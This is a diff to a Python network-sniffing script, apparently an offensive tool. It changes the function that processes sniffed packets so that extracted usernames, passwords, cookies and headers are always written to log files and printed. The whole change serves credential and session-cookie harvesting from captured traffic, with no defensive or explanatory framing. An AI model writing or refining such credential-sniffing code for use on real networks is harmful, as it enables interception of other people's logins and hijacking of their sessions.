@@ -37,7 +37,8 @@ def process_sniffed_packet(packet):
         add_in_file(data=url_print, file="url")
 
         login_info = get_login(packet)
-        if login_info is not None and "None" in login_info:
+        if login_info is not None:
+            print(login_info)
             login_info_print = """
             >>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<
             [+] Possible username/password >> {}
@@ -47,14 +48,14 @@ def process_sniffed_packet(packet):
             add_in_file(data=login_info_print, file="login")
 
         cookie_info = get_cookie(packet)
-        if cookie_info is not None and "None" in cookie_info:
+        if cookie_info is not None:
             cookie_info_print = """
             [+] Cookie Info >> {}
             """.format(cookie_info)
             add_in_file(data=cookie_info_print, file="cookie")
 
         headers_info = get_headers(packet)
-        if headers_info is not None and "None" in headers_info:
+        if headers_info is not None:
             headers_info_print = """
             [+] Headers info >> {}
             """.format(headers_info)
